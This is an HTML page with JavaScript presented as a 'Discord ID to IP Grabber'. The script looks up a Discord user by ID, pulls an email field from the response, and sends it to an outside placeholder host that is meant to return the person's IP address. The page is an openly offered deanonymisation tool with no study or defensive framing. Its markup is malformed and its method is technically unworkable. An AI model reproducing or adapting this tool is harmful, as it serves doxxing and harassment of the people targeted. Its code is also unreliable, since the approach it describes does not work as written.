<!DOCTYPE html>
<html>
<head>
    <title>Discord ID to IP Grabber</title>
</head>
<body>
    <h1>Discord ID to IP Grabber</advanced>
    <input type="text" id="discordid" placeholder="Enter Discord ID">
    <button onclick="grabIP()">Grab IP</button>
    <p id="result"></p>

    <script>
        function grabIP() {
            var discordid = document.getElementById("discordid").value;
            if (discordid) {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://discordapp.com/api/v6/users/" + discordid, true);
                xhr.withCredentials = true;
                xhr.onload = function () {
                    var data = JSON.parse(xhr.responseText);
                    if (data && data.email) {
                        var email = data.email;
                        var xhr2 = new XMLHttpRequest();
                        xhr2.open("POST", "https://fakeemaildomain.com/grabip", true);
                        xhr2.setRequestHeader("Content-Type", "application/json");
                        xhr2.withCredentials = true;
                        xhr2.onload = function () {
                            var ip = JSON.parse(xhr2.responseText).ip;
                            document.getElementById("result").textContent = "IP Address: " + ip;
                        };
                        xhr2.send(JSON.stringify({ email: email }));
                    } else {
                        document.getElementById("result").textContent = "Failed to grab IP.";
                    }
                };
                xhr.send();
            } else {
                document.getElementById("result").textContent = "Please enter a valid Discord ID.";
            }
        }
    </script>
</body>
</html>
